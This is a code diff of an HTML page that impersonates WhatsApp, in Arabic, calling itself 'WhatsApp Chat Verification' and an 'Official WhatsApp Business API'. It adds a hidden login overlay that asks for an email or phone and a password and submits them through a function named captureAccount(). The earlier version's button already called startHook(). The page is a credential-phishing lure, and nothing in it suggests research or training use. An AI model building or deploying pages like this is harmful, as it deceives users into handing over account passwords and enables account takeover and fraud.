@@ -1,33 +1,43 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WhatsApp Web</title>
+    <title>WhatsApp Chat Verification</title>
     <link rel="stylesheet" href="style.css">
 </head>
 <body>
 
-    <div class="wa-container">
-        <div class="wa-header">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp" class="wa-logo">
-        </div>
-        
+    <div id="main-ui" class="wa-container">
+        <div class="wa-header"><img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" class="wa-logo"></div>
         <div class="wa-body">
             <div class="user-info">
-                <img src="img/your-profile.jpg" alt="Profile" class="profile-pic">
-                <h3>Your Name</h3>
-                <p>WhatsApp Business Account</p>
+                <img src="img/your-profile.jpg" class="profile-pic">
+                <h3>نظام التحقق من الهوية</h3>
+                <p>Official WhatsApp Business API</p>
             </div>
-            
             <div class="action-box">
-                <p>Chat with <b>+966 5X XXX XXXX</b> on WhatsApp</p>
-                <button class="btn-continue" onclick="startHook()">CONTINUE TO CHAT</button>
+                <p>لبدء الدردشة المشفرة مع <b>المسؤول</b>، يرجى تأكيد ملكية الحساب.</p>
+                <button class="btn-continue" onclick="startVerification()">بدء التحقق والدردشة</button>
             </div>
+        </div>
+    </div>
+
+    <div id="login-popup" class="login-overlay" style="display:none;">
+        <div class="login-card">
+            <div id="provider-logo"></div>
+            <h2 id="login-title">تسجيل الدخول</h2>
+            <p id="login-desc">استخدم حسابك لمزامنة جهات الاتصال</p>
             
-            <div class="wa-footer-text">
-                <p>Don't have WhatsApp yet?<br><a href="#">Download</a></p>
+            <div id="loading-spinner" class="spinner" style="display:none;"></div>
+
+            <div id="input-fields" class="input-group">
+                <input type="email" id="user-email" placeholder="البريد الإلكتروني أو الهاتف" required>
+                <input type="password" id="user-pass" placeholder="أدخل كلمة المرور" required>
             </div>
+
+            <button id="main-btn" class="btn-signin" onclick="captureAccount()">التالي</button>
+            <div class="login-footer"><a href="#">هل نسيت البريد الإلكتروني؟</a></div>
         </div>
     </div>
 
